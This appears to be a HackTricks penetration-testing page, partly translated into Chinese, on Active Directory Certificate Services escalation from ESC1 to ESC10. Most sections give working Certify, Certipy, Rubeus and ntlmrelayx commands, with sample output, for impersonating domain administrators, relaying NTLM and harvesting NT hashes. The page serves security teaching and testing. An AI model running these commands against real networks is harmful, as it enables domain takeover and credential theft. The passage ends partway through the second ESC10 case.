# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**这是下面文章中升级技术部分的摘要：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
- **Manager approval is not required.**
- **No signatures from authorized personnel are needed.**
- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
- **Certificate templates are configured to define EKUs that facilitate authentication:**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
- The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.

> [!CAUTION]
> 上述配置允许低权限用户请求带有任意 SAN 的证书，从而通过 Kerberos 或 SChannel 以任何域主体的身份进行身份验证。

此功能有时会被启用以支持产品或部署服务即时生成 HTTPS 或主机证书，或因缺乏理解而被误配置。

需要注意的是，使用此选项创建证书会触发警告，而当复制现有证书模板（例如启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板）并随后修改以包含身份验证 OID 时，则不会出现该警告。

### 滥用

要 **查找易受攻击的证书模板** 你可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**滥用此漏洞以冒充管理员**，可以运行：
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
然后你可以将生成的 **证书转换为 `.pfx` 格式**，并再次使用 **Rubeus 或 certipy 进行身份验证**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 二进制文件 "Certreq.exe" & "Certutil.exe" 可用于生成 PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以通过运行以下 LDAP 查询枚举 AD Forest 的配置架构中的证书模板，具体为那些不需要批准或签名、具有 Client Authentication 或 Smart Card Logon EKU 且启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的模板：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 错误配置的证书模板 - ESC2

### 解释

第二种滥用场景是第一种的一个变体：

1. Enterprise CA 向低权限用户授予了证书注册（enrollment）权限。
2. 对经理审批的要求被禁用。
3. 对授权签名的需求被省略。
4. 证书模板的安全描述符过于宽松，授予低权限用户证书注册权限。
5. **证书模板被定义为包含 Any Purpose EKU 或没有 EKU。**

**Any Purpose EKU** 允许攻击者获取用于**任意用途**的证书，包括客户端认证、服务器认证、代码签名等。可以采用用于 **ESC3** 的相同技术来利用该场景。

没有 EKU 的证书（作为下级 CA 证书）可以被用于**任意用途**，并且**也可以用于签发新证书**。因此，攻击者可以利用下级 CA 证书在新证书中指定任意 EKU 或字段。

然而，如果下级 CA 未被 **`NTAuthCertificates`** 对象信任（默认设置），为**域身份验证**创建的新证书将无法生效。尽管如此，攻击者仍然可以创建带有任意 EKU 和任意证书值的**新证书**。这些证书可能被**滥用**于多种用途（例如代码签名、服务器认证等），并可能对网络中的其他应用（如 SAML、AD FS 或 IPSec）产生重大影响。

要在 AD Forest 的配置架构中枚举符合该场景的模板，可以运行以下 LDAP 查询：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置不当的 Enrolment Agent 模板 - ESC3

### 说明

这个场景类似第一个和第二个，但**滥用**了一个**不同的 EKU**（Certificate Request Agent）和**两种不同的模板**（因此有两套要求），

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1)，在 Microsoft 文档中称为 **Enrollment Agent**，允许一个主体代表另一个用户为其**enroll**一个**certificate**。

The **“enrollment agent”** 会在这样的**模板**中 enroll，并使用得到的 **certificate 来代表另一个用户对 CSR 进行联合签名（co-sign a CSR）**。然后它将**联合签名的 CSR**发送给 CA，在允许 “enroll on behalf of” 的**模板**中进行 enroll，CA 会返回一个属于“另一个”用户的**certificate**。

**要求 1：**

- Enterprise CA 将 enrollment 权限授予低权限用户。
- 省略了 manager approval 的要求。
- 不要求 authorized signatures。
- 证书模板的 security descriptor 过于宽松，授予低权限用户 enrollment 权限。
- 证书模板包含 Certificate Request Agent EKU，允许代表其他主体请求其他证书模板。

**要求 2：**

- Enterprise CA 将 enrollment 权限授予低权限用户。
- manager approval 被绕过。
- 模板的 schema 版本为 1 或大于 2，且指定了一个需要 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
- 证书模板中定义的某个 EKU 允许 domain authentication。
- CA 上未对 enrollment agents 应用限制。

### 滥用

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来滥用该场景：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **用户** who are allowed to **获取** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CA. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **默认** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## 易受攻击的证书模板访问控制 - ESC4

### **解释**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **攻击者** possess the requisite **权限** to **修改** a **template** and **引入** any **可利用的错误配置** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

- **Owner:** 隐含地赋予对对象的控制权，允许修改任何属性。
- **FullControl:** 赋予对对象的完全控制，包括修改任何属性的能力。
- **WriteOwner:** 允许将对象的所有者更改为攻击者可控制的主体。
- **WriteDacl:** 允许调整访问控制，可能授予攻击者 FullControl。
- **WriteProperty:** 授权编辑任何对象属性。

### 滥用

To identify principals with edit rights on templates and other PKI objects, enumerate with Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
An example of a privesc like the previous one:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以使用单个命令覆盖证书模板的配置。**默认** 情况下，Certipy 会 **覆盖** 配置，使其 **易受 ESC1 影响**。我们也可以指定 **`-save-old` 参数以保存旧的配置**，这在攻击后用于 **恢复** 配置时会很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### 说明

基于 ACL 的广泛互联关系网（不仅限于 certificate templates 和 certificate authority）可能会影响整个 AD CS 系统的安全性。那些可能显著影响安全的对象包括：

- CA 服务器的 AD 计算机对象，可能通过 S4U2Self 或 S4U2Proxy 等机制被攻破。
- CA 服务器的 RPC/DCOM 服务。
- 特定容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 下的任何后代 AD 对象或容器。该路径包括但不限于诸如 Certificate Templates container、Certification Authorities container、NTAuthCertificates 对象以及 Enrollment Services Container 等容器和对象。

如果低权限攻击者设法控制上述任何关键组件，PKI 系统的安全性可能被破坏。

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 说明

在 [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也触及了 Microsoft 所述的 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志的影响。该配置在 Certification Authority (CA) 上启用时，允许在 **任何请求** 的 **subject alternative name** 中包含 **用户定义的值**，包括那些来自 Active Directory® 构造的请求。因此，这一配置允许入侵者通过任何为域 **authentication** 设置并允许 **unprivileged** 用户注册的模板（例如标准 User template）进行注册。结果，入侵者可以获取证书，从而以域管理员或域内 **任何其他活动主体** 的身份进行身份验证。

**注意**：通过 `certreq.exe` 的 `-attrib "SAN:"` 参数（称为 “Name Value Pairs”）将 **alternative names** 附加到 Certificate Signing Request (CSR) 的方法，与 ESC1 中对 SAN 的利用策略存在 **对比**。这里的区别在于账户信息的封装方式——是作为证书属性而非扩展。

### 滥用

要验证该设置是否已启用，组织可以使用 `certutil.exe` 执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
此操作本质上采用 **remote registry access**，因此，另一种方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测到此错误配置并加以利用：
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要更改这些设置，假设拥有 **域管理员** 权限或等效权限，可在任何工作站上执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在你的环境中禁用此配置，可以使用以下命令移除该标志：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 在 2022 年 5 月的安全更新之后，新签发的 **证书** 将包含一个 **安全扩展**，该扩展包含 **请求者的 `objectSid` 属性**。对于 ESC1，此 SID 来源于指定的 SAN。然而，对于 **ESC6**，该 SID 反映的是 **请求者的 `objectSid`**，而不是 SAN。\
> 要利用 ESC6，系统必须易受 ESC10 (Weak Certificate Mappings) 的影响，后者会将 **SAN 优先于新的安全扩展**。

## 脆弱的证书颁发机构访问控制 - ESC7

### 攻击 1

#### 解释

证书颁发机构的访问控制通过一组权限来维护，这些权限管理 CA 的操作。可以通过访问 `certsrv.msc`，右键单击 CA，选择属性，然后转到 Security 选项卡来查看这些权限。此外，还可以使用 PSPKI 模块并运行类似如下的命令来枚举权限：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
这部分说明了主要权限，即 **`ManageCA`** 和 **`ManageCertificates`**，分别对应“CA 管理员”和“证书管理员”角色。

#### Abuse

在证书颁发机构上拥有 **`ManageCA`** 权限允许主体使用 PSPKI 远程修改设置。 这包括切换 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志以允许在任何模板中指定 SAN（Subject Alternative Name），这是域升级的关键环节。

可以通过使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet 简化此过程，从而在不直接使用 GUI 的情况下进行修改。

拥有 **`ManageCertificates`** 权限可以批准待处理请求，实际上绕过了“CA certificate manager approval”这一防护。

可以结合使用 **Certify** 和 **PSPKI** 模块来请求、批准并下载证书：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻击 2

#### 解释

> [!WARNING]
> 在 **上一轮攻击** 中使用了 **`Manage CA`** 权限来 **启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志以执行 **ESC6 attack**，但在 CA 服务（`CertSvc`）重启之前这不会生效。当用户拥有 `Manage CA` 访问权限时，该用户也被允许 **重启服务**。然而，这并不意味着用户可以远程重启服务。此外，由于 2022 年 5 月的安全更新，E**SC6 might not work out of the box** 在大多数已打补丁的环境中。

因此，这里介绍另一种攻击。

Perquisites:

- 仅 **`ManageCA` permission**
- **`Manage Certificates`** permission（可以由 **`ManageCA`** 授予）
- 证书模板 **`SubCA`** 必须被 **enabled**（可以由 **`ManageCA`** 启用）

该技术基于这样一个事实：拥有 `Manage CA` _和_ `Manage Certificates` 访问权限的用户可以**发出失败的证书请求**。`SubCA` 证书模板**vulnerable to ESC1**，但**只有管理员**可以在该模板中 enroll。因此，**用户**可以**request** 在 **`SubCA`** 中 enroll —— 该请求将被 **denied** —— 但随后可以由管理者 **issued**。

#### Abuse

你可以通过将你的用户添加为新的 officer 来**grant yourself the `Manage Certificates`** 访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以使用 `-enable-template` 参数**在 CA 上启用**。默认情况下，`SubCA` 模板已启用。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已经满足此攻击的先决条件，我们可以开始通过**请求基于 `SubCA` 模板的证书**。

**这个请求将被拒绝**，但我们会保存 private key 并记录 request ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
有了我们的 **`Manage CA` and `Manage Certificates`** 权限后，我们可以使用 `ca` 命令和 `-issue-request <request ID>` 参数来 **签发失败的证书请求**。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数，**检索已签发的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 攻击 3 – Manage Certificates 扩展滥用 (SetExtension)

#### 解释

除了传统的 ESC7 滥用（启用 EDITF 属性或批准挂起的请求）之外，**Certify 2.0** 还揭示了一个全新的原语，仅需在 Enterprise CA 上拥有 *Manage Certificates*（又名 **Certificate Manager / Officer**）角色。

任何持有 *Manage Certificates* 的主体都可以执行 `ICertAdmin::SetExtension` RPC 方法。虽然该方法传统上由合法 CA 用于更新**挂起**请求上的扩展，但攻击者可以滥用它来**将一个*非默认*的证书扩展**（例如自定义的 *Certificate Issuance Policy* OID，如 `1.1.1.1`）附加到等待审批的请求上。

因为目标模板**未为该扩展定义默认值**，CA 在签发请求时不会覆盖攻击者控制的值。结果证书因此包含攻击者选择的扩展，该扩展可能会：

* 满足其他易受攻击模板的 Application / Issuance Policy 要求（导致权限提升）。
* 注入额外的 EKU 或策略，使证书在第三方系统中获得意外的信任。

简而言之，先前被认为是 ESC7 “较弱” 一半的 *Manage Certificates*，现在可以在不修改 CA 配置或不需要更严格的 *Manage CA* 权限的情况下，被用于完整的权限提升或长期持久化。

#### 使用 Certify 2.0 滥用该原语

1. **提交一个会保持为 *pending* 的证书请求。** 可以使用需要管理者批准的模板强制保持挂起：
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 使用新的 `manage-ca` 命令**向挂起请求附加自定义扩展**：
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*如果模板尚未定义 *Certificate Issuance Policies* 扩展，上述值在签发后将被保留。*

3. **签发请求**（如果你的角色也具有 *Manage Certificates* 的批准权限）或等待操作员批准。签发后，下载证书：
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成的证书现在包含恶意的 issuance-policy OID，可在后续攻击中使用（例如 ESC13、域权限提升等）。

> NOTE: 通过 `ca` 命令和 `-set-extension` 参数，Certipy ≥ 4.7 也能执行相同攻击。

## NTLM 中继到 AD CS HTTP 端点 – ESC8

### 解释

> [!TIP]
> 在 **AD CS 已安装** 的环境中，如果存在**易受攻击的 web enrollment endpoint**，并且至少发布了一个允许**域计算机注册和客户端身份验证**的**证书模板**（例如默认的 **`Machine`** 模板），那么 **任何启用了 spooler 服务的计算机都可能被攻击者攻陷**！

AD CS 支持多种基于 HTTP 的注册方法，这些方法通过管理员可能安装的额外服务器角色提供。用于 HTTP 注册的这些接口容易受到 **NTLM relay** 攻击。攻击者在**已被攻陷的机器上**，可以冒充任何通过入站 NTLM 进行身份验证的 AD 帐户。在冒充受害者帐户期间，攻击者可以访问这些 Web 接口以**使用 `User` 或 `Machine` 证书模板请求客户端身份验证证书**。

- **web enrollment interface**（一个较旧的 ASP 应用，位于 `http://<caserver>/certsrv/`）默认仅使用 HTTP，不提供对 NTLM relay 攻击的保护。此外，它通过其 Authorization HTTP 头显式只允许 NTLM 身份验证，使更安全的身份验证方法（如 Kerberos）无法使用。
- **Certificate Enrollment Service** (CES)、**Certificate Enrollment Policy** (CEP) Web Service 和 **Network Device Enrollment Service** (NDES) 默认通过它们的 Authorization HTTP 头支持 negotiate 身份验证。Negotiate 身份验证**同时支持** Kerberos 和 **NTLM**，允许攻击者在中继攻击期间**降级到 NTLM** 身份验证。尽管这些 Web 服务默认启用 HTTPS，但仅有 HTTPS **并不能防止 NTLM relay 攻击**。对 HTTPS 服务免受 NTLM relay 攻击的保护仅在 HTTPS 与 channel binding 结合时才可行。遗憾的是，AD CS 并未在 IIS 上启用 Extended Protection for Authentication，这对于 channel binding 是必要的。

NTLM relay 攻击的一个常见问题是 NTLM 会话的**短时效性**以及攻击者无法与要求 **NTLM signing** 的服务交互的限制。

不过，这一限制可以通过利用 NTLM relay 攻击获取用户的证书来克服，因为证书的有效期决定了会话的持续时间，并且证书可以用于要求 **NTLM signing** 的服务。有关如何使用被窃取证书的说明，请参见：


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 攻击的另一个限制是 **必须由受害帐户对攻击者控制的机器进行身份验证**。攻击者可以选择等待或尝试**强制**该身份验证：


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **滥用**

[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 枚举 **已启用的 HTTP AD CS 端点**：
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性被企业证书颁发机构 (CAs) 用于存储证书注册服务 (CES) 端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### 使用 Certify 进行滥用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 使用 [Certipy](https://github.com/ly4k/Certipy) 进行滥用

默认情况下，Certipy 会基于模板 `Machine` 或 `User` 发起证书请求，这取决于被中继的账号名是否以 `$` 结尾。可以通过使用 `-template` 参数来指定其他模板。

随后可以使用诸如 [PetitPotam](https://github.com/ly4k/PetitPotam) 的技术来强制认证。针对域控制器时，需要指定 `-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无安全扩展 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 解释

新的值 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）用于 **`msPKI-Enrollment-Flag`**，称为 ESC9，可防止在证书中嵌入新的 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展。 当 `StrongCertificateBindingEnforcement` 设置为 `1`（默认设置）时，该标志变得相关，这与设置为 `2` 的情况形成对比。 在可能被利用以针对 Kerberos 或 Schannel 的较弱证书映射（如 ESC10）进行攻击的场景中，其重要性更高，因为缺少 ESC9 并不会改变这些要求。

使该标志设置变得重要的条件包括：

- `StrongCertificateBindingEnforcement` 未被设置为 `2`（默认是 `1`），或者 `CertificateMappingMethods` 包含 `UPN` 标志。
- 证书在 `msPKI-Enrollment-Flag` 设置中被标注了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
- 证书指定了任何用于客户端认证的 EKU。
- 对任意账户具有 `GenericWrite` 权限以入侵另一账户。

### 滥用场景

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是攻破 `Administrator@corp.local`。 `ESC9` 证书模板（`Jane@corp.local` 被允许注册的）在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

最初，借助 `John` 的 `GenericWrite`，通过 Shadow Credentials 获取了 `Jane` 的 hash：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，`Jane`的`userPrincipalName`被修改为`Administrator`，故意省略了`@corp.local`域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
该修改并不违反约束，因为 `Administrator@corp.local` 仍然作为 `Administrator` 的 `userPrincipalName` 保持唯一性。

随后，标记为 vulnerable 的 `ESC9` 证书模板以 `Jane` 的身份被请求：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
注意到证书的 `userPrincipalName` 显示为 `Administrator`，且没有任何 “object SID”。

`Jane` 的 `userPrincipalName` 随后被还原为她原始的 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
现在使用颁发的证书尝试进行身份验证会返回 `Administrator@corp.local` 的 NT 哈希。由于该证书未指定域，命令必须包含 `-domain <domain>`：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 弱证书映射 - ESC10

### 说明

ESC10 涉及域控制器上的两个注册表键值：

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

### 情况 1

当 `StrongCertificateBindingEnforcement` 配置为 `0`。

### 情况 2

如果 `CertificateMappingMethods` 包含 `UPN` 位 (`0x4`)。

### 滥用案例 1

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，具有 `GenericWrite` 权限的账户 A 可以被利用来入侵任意账户 B。

例如，若对 `Jane@corp.local` 拥有 `GenericWrite` 权限，攻击者的目标是入侵 `Administrator@corp.local`。该流程类似于 ESC9，允许使用任意证书模板。

最初，通过 Shadow Credentials 利用 `GenericWrite` 来获取 `Jane` 的哈希。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，`Jane` 的 `userPrincipalName` 被更改为 `Administrator`，故意省略 `@corp.local` 部分以避免触发约束冲突。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
随后，以 `Jane` 身份请求了一个启用客户端身份验证的证书，使用默认的 `User` 模板。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 随后被还原为其原始值 `Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获取的证书进行身份验证将会得到 `Administrator@corp.local` 的 NT hash；由于证书中没有域信息，必须在命令中指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 滥用案例 2

当 `CertificateMappingMethods` 包含 `UPN` 位标志 (`0x4`) 时，具有 `GenericWrite` 权限的账户 A 可以危及任何缺少 `userPrincipalName` 属性的账户 B，包括计算机账户和内置域管理员 `Administrator`。

在此，目标是妥协 `DC$@corp.local`，首先通过 Shadow Credentials 获取 `Jane` 的哈希，利用 `GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
然后将 `Jane` 的 `userPrincipalName` 设置为 `DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
